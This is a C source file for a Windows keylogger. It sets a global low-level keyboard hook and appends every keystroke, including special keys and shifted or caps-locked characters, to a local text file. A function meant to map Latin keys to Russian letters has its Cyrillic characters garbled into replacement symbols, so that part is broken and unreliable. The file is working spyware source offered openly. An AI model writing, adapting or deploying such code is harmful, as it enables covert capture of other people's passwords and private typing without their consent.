#include <Windows.h>
#include <stdio.h>
#include <malloc.h>
#define PATH L"..\\KeyLoger.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 20

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(WCHAR c);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);
	return 0;
}

BOOL IsCaps(void)
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^ (GetKeyState(VK_SHIFT) & 0x8000) != 0)
	{
		return TRUE;
	}
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (LPKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
		{
			iKey |= 0x1 << 24;
		}
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1)
		{
			WriteToFile(L"[");
			WriteToFile(KeyString);
			WriteToFile(L"]");
		}
		else
		{
			if (!IsCaps())
			{
				KeyString[0] = tolower(KeyString[0]);
			}
			if (KeyLayout == ENG)
			{

			}
			if (KeyLayout == RUS)
			{
				KeyString[0] = EnToRus(KeyString[0]);
			}
			WriteToFile(KeyString);
		}
		free(KeyString);
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, L"..\\KeyLoger.txt", L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

WCHAR EnToRus(WCHAR c)
{
	switch (c)
	{
	case L'`':
		return L'�';
	case L'q':
		return L'�';
	case L'w':
		return L'�';
	case L'e':
		return L'�';
	case L'r':
		return L'�';
	case L't':
		return L'�';
	case L'y':
		return L'�';
	case L'u':
		return L'�';
	case L'i':
		return L'�';
	case L'o':
		return L'�';
	case L'p':
		return L'�';
	case L'[':
		return L'�';
	case L']':
		return L'�';
	case L'a':
		return L'�';
	case L's':
		return L'�';
	case L'd':
		return L'�';
	case L'f':
		return L'�';
	case L'g':
		return L'�';
	case L'h':
		return L'�';
	case L'j':
		return L'�';
	case L'k':
		return L'�';
	case L'l':
		return L'�';
	case L';':
		return L'�';
	case L'\'':
		return L'�';
	case L'z':
		return L'�';
	case L'x':
		return L'�';
	case L'c':
		return L'�';
	case L'v':
		return L'�';
	case L'b':
		return L'�';
	case L'n':
		return L'�';
	case L'm':
		return L'�';
	case L',':
		return L'�';
	case L'.':
		return L'�';
	default:
		return L' ';
	}
}